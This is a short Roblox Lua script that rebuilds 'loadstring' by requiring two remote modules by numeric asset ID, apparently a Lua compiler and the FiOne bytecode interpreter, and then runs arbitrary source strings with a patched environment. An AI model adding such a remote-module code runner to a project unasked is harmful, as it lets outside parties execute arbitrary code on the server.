local _env = getfenv()

local createExecutable = function(bCode, env)
    fione = require(tonumber("100935166061231"))
    return fione.wrap_lua(fione.stm_lua(bCode), env or _env)
end

local ls = function(source, env)
    local executable
    local env = env or _env
    local name = (env.script and env.script:GetFullName())

    compile = require(tonumber("125795446062284"))
    local ran, failureReason = pcall(function()
        local compiledBytecode = compile(source, name)
        executable = createExecutable(compiledBytecode, env)
    end)

    if ran then
        return setfenv(executable, env)
    end
    return nil, failureReason
end


local function fixenv()
    game = _env.game
    Game = game
    Instance = _env.Instance
    CFrame = _env.CFrame
    Vector3 = _env.Vector3
    math = _env.math
end

local run = function(source)
    fixenv()
    ls(source)()
    fixenv()
    
    return function()
        return
    end
end